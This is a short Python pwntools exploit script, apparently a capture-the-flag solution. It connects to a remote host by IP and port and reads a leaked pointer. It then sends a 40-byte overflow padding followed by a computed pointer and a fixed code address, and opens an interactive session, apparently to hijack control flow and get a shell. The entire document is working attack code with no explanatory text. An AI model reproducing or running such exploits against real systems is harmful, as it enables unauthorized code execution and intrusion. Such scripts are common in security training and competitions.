from pwn import *

proc = remote("109.233.56.90", 11604)
s = proc.recvuntil(b"U: 0x")
s = proc.recvuntil(b" P:")[:-3]
#print(s)
input()
ptr = int(s, 16) + 56
proc.send(b"A"*40 + p64(ptr))
proc.send(p64(0x00401182))
proc.interactive()

